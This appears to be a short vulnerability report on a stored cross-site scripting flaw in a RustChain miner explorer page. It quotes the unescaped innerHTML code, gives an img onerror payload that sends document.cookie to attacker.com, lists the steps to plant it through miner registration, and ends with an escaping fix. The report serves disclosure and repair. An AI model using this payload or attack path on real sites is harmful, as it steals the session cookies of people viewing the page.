Vulnerability #1: Stored XSS via Miner ID

The enhanced-explorer.html renders miner.miner_id directly into innerHTML without escapeHtml():

overviewTable.innerHTML = minerList.map(miner => `
    <td><strong>${miner.miner_id}</strong></td>  ← UNSAFE
`).join('');

A malicious miner registers with ID containing:

<img src=x onerror="fetch('https://attacker.com/steal?miner='+document.cookie)">

When viewed in the explorer, the onerror fires immediately.

⚠️ Note

This PoC simulates the vulnerability locally. The real attack requires:

  1. Register a malicious miner with the RustChain agent registration API
  2. Wait for the explorer's refresh cycle to pick up the new miner
  3. When anyone visits the Miners tab — XSS fires

Fix: Add escapeHtml(miner.miner_id) in all innerHTML template literals.
